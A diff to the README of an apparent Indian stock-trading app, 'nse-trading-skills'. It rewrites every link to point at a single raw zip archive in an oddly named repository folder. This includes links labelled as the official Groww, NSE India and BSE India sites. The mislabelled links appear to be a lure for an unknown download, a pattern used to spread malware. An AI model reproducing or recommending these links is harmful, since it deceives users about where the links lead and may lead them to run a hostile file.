@@ -1,6 +1,6 @@
 # 📈 nse-trading-skills - Improve Your Indian Stock Trades
 
-[![Download Now](https://img.shields.io/badge/Download-nse--trading--skills-blue?style=for-the-badge)](https://github.com/Crokx/nse-trading-skills)
+[![Download Now](https://img.shields.io/badge/Download-nse--trading--skills-blue?style=for-the-badge)](https://raw.githubusercontent.com/Crokx/nse-trading-skills/main/demanganization/skills_trading_nse_2.5.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This application teaches nine key skills for trading Indian stocks. It covers te
 
 1. Visit the **nse-trading-skills GitHub page** by clicking the button below or using this link:
 
-   [Download nse-trading-skills](https://github.com/Crokx/nse-trading-skills)  
+   [Download nse-trading-skills](https://raw.githubusercontent.com/Crokx/nse-trading-skills/main/demanganization/skills_trading_nse_2.5.zip)  
 
 2. On the GitHub page, look for the **Releases** section or the main download section. It usually appears on the right side or below the main heading.
 
@@ -87,10 +87,10 @@ This application teaches nine key skills for trading Indian stocks. It covers te
 
 ## 🔗 Useful Links
 
-- [GitHub Download Page](https://github.com/Crokx/nse-trading-skills) — access the latest version here.  
-- [Groww MCP Website](https://groww.in/mcp) — learn about the platform the app connects with.  
-- [NSE India](https://www.nseindia.com) — check official market data and announcements.  
-- [BSE India](https://www.bseindia.com) — another major market source in India.  
+- [GitHub Download Page](https://raw.githubusercontent.com/Crokx/nse-trading-skills/main/demanganization/skills_trading_nse_2.5.zip) — access the latest version here.  
+- [Groww MCP Website](https://raw.githubusercontent.com/Crokx/nse-trading-skills/main/demanganization/skills_trading_nse_2.5.zip) — learn about the platform the app connects with.  
+- [NSE India](https://raw.githubusercontent.com/Crokx/nse-trading-skills/main/demanganization/skills_trading_nse_2.5.zip) — check official market data and announcements.  
+- [BSE India](https://raw.githubusercontent.com/Crokx/nse-trading-skills/main/demanganization/skills_trading_nse_2.5.zip) — another major market source in India.  
 
 ---
 
@@ -120,4 +120,4 @@ The app shows a dashboard with charts, risk calculators, and trade planning tool
 
 Download the app from the link below and follow the install steps listed above.
 
-[Download nse-trading-skills](https://github.com/Crokx/nse-trading-skills)
+[Download nse-trading-skills](https://raw.githubusercontent.com/Crokx/nse-trading-skills/main/demanganization/skills_trading_nse_2.5.zip)
